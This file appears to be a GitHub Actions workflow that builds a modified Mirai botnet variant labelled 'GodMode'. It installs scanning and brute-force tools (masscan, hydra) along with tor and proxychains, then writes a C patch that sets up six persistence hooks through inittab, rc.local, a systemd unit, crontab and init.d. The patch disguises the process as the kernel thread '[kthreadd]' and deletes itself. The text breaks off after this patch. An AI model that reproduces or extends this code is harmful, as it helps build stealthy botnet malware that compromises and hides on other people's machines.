jobs:
  launch_dark:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dark tools + clone original Mirai
        run: |
          sudo apt update && sudo apt install -y git build-essential tor proxychains sshpass masscan hydra
          git clone https://github.com/jgamblin/Mirai-Source-Code.git --depth 1
          cd Mirai-Source-Code

      - name: Build GodMode with 6 layers + exploits + evasion + multi-C2
        run: |
          # 6 persistence layers + watchdog + self-delete
          cat > /tmp/patch.c << 'EOF'
int main() {
  system("echo '::respawn:/usr/local/bin/[kthreadd]' >> /etc/inittab 2>/dev/null || true");
  system("echo '/usr/local/bin/[kthreadd] &' >> /etc/rc.local 2>/dev/null || true");
  system("cat > /etc/systemd/system/persist.service << EOF2
[Unit]
Description=System Daemon
[Service]
ExecStart=/usr/local/bin/[kthreadd]
Restart=always
[Install]
WantedBy=multi-user.target
EOF2");
  system("systemctl enable persist.service 2>/dev/null || true");
  system("echo '*/5 * * * * /usr/local/bin/[kthreadd]' >> /etc/crontab 2>/dev/null || true");
  system("cat > /etc/init.d/sysd << EOF3
#!/bin/sh
/usr/local/bin/[kthreadd] &
EOF3");
  system("chmod +x /etc/init.d/sysd && update-rc.d sysd defaults 2>/dev/null || true");
  prctl(PR_SET_NAME, "[kthreadd]", 0, 0, 0);
  system("rm -f $0");
  return 0;
}
EOF
